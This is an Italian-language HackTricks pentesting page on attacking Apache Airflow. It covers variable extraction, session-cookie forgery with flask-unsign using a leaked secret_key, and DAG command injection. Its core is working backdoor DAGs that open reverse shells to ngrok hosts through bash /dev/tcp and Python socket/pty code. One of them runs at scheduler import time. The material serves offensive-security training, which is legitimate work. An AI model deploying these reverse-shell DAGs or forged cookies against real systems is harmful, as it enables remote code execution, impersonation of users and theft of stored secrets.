# Sicurezza di Apache Airflow

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informazioni di base

[**Apache Airflow**](https://airflow.apache.org) funge da piattaforma per **orchestrare e pianificare flussi di dati o flussi di lavoro**. Il termine "orchestrazione" nel contesto dei flussi di dati indica il processo di organizzazione, coordinamento e gestione di flussi di lavoro complessi che provengono da varie fonti. Lo scopo principale di questi flussi di dati orchestrati √® fornire set di dati elaborati e utilizzabili. Questi set di dati vengono ampiamente utilizzati da una miriade di applicazioni, tra cui strumenti di business intelligence, modelli di data science e machine learning, tutti fondamentali per il funzionamento delle applicazioni di big data.

In sostanza, Apache Airflow ti permetter√† di **programmare l'esecuzione del codice quando accade qualcosa** (evento, cron).

## Laboratorio locale

### Docker-Compose

Puoi utilizzare il **file di configurazione docker-compose da** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) per avviare un ambiente completo di Apache Airflow con Docker. (Se sei su MacOS, assicurati di assegnare almeno 6 GB di RAM alla VM di Docker).

### Minikube

Un modo semplice per **eseguire Apache Airflow** √® eseguirlo **con minikube**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Configurazione di Airflow

Airflow potrebbe memorizzare **informazioni sensibili** nella sua configurazione o potresti trovare configurazioni deboli:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## RBAC di Airflow

Prima di iniziare ad attaccare Airflow, √® necessario capire **come funzionano le autorizzazioni**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Attacchi

### Enumerazione della console Web

Se hai **accesso alla console web**, potresti essere in grado di accedere a una parte o a tutte le seguenti informazioni:

* **Variabili** (qui potrebbero essere memorizzate informazioni sensibili personalizzate)
* **Connessioni** (qui potrebbero essere memorizzate informazioni sensibili personalizzate)
* Accedile in `http://<airflow>/connection/list/`
* [**Configurazione**](./#airflow-configuration) (informazioni sensibili come la **`secret_key`** e le password potrebbero essere memorizzate qui)
* Elenco degli **utenti e dei ruoli**
* **Codice di ogni DAG** (che potrebbe contenere informazioni interessanti)

### Recupero dei valori delle variabili

Le variabili possono essere memorizzate in Airflow in modo che i **DAG** possano **accedere** ai loro valori. √à simile ai segreti di altre piattaforme. Se hai **autorizzazioni sufficienti**, puoi accedervi nell'interfaccia grafica in `http://<airflow>/variable/list/`.\
Per impostazione predefinita, Airflow mostrer√† il valore della variabile nell'interfaccia grafica, tuttavia, secondo [**questo**](https://marclamberti.com/blog/variables-with-apache-airflow/), √® possibile impostare un **elenco di variabili** il cui **valore** apparir√† come **asterischi** nell'**interfaccia grafica**.

![](<../../.gitbook/assets/image (79).png>)

Tuttavia, questi **valori** possono ancora essere **recuperati** tramite **CLI** (√® necessario avere accesso al database), esecuzione **arbitraria di DAG**, **API** che accedono al punto di accesso delle variabili (l'API deve essere attivata) e **anche l'interfaccia grafica stessa!**\
Per accedere a quei valori dall'interfaccia grafica, **seleziona le variabili** a cui desideri accedere e **clicca su Azioni -> Esporta**.\
Un altro modo √® eseguire un **bruteforce** del **valore nascosto** utilizzando il **filtro di ricerca** fino a quando non lo ottieni:

![](<../../.gitbook/assets/image (30).png>)

### Escalation dei privilegi

Se la configurazione **`expose_config`** √® impostata su **True**, dalla **funzione Utente** in su √® possibile **leggere** la **configurazione nel web**. In questa configurazione, appare la **`secret_key`**, il che significa che qualsiasi utente con questa chiave valida pu√≤ **creare il proprio cookie firmato per impersonare qualsiasi altro account utente**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### Backdoor DAG (RCE in Airflow worker)

Se hai **accesso in scrittura** al luogo in cui vengono **salvati i DAG**, puoi semplicemente **crearne uno** che ti invier√† una **shell inversa**.\
Nota che questa shell inversa verr√† eseguita all'interno di un **contenitore del worker di Airflow**:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### Backdoor DAG (RCE nel scheduler di Airflow)

Se imposti qualcosa da **eseguire nella radice del codice**, al momento della scrittura, verr√† **eseguito dallo scheduler** dopo un paio di secondi dopo averlo inserito nella cartella del DAG.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### Creazione DAG

Se riesci a **compromettere una macchina all'interno del cluster DAG**, puoi creare nuovi **script DAG** nella cartella `dags/` e verranno **replicati nel resto delle macchine** all'interno del cluster DAG.

### Iniezione di codice DAG

Quando esegui un DAG dall'interfaccia grafica, puoi **passare argomenti** ad esso.\
Pertanto, se il DAG non √® codificato correttamente, potrebbe essere **vulnerabile all'iniezione di comandi**.\
Questo √® ci√≤ che √® successo in questa CVE: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Tutto ci√≤ che devi sapere per **iniziare a cercare iniezioni di comandi nei DAG** √® che i **parametri** sono **accessibili** con il codice **`dag_run.conf.get("nome_parametro")`**.

Inoltre, la stessa vulnerabilit√† potrebbe verificarsi con le **variabili** (nota che con sufficienti privilegi potresti **controllare il valore delle variabili** nell'interfaccia grafica). Le variabili sono **accessibili con**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Se vengono utilizzati ad esempio all'interno di un comando bash, potresti eseguire un'iniezione di comando.

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
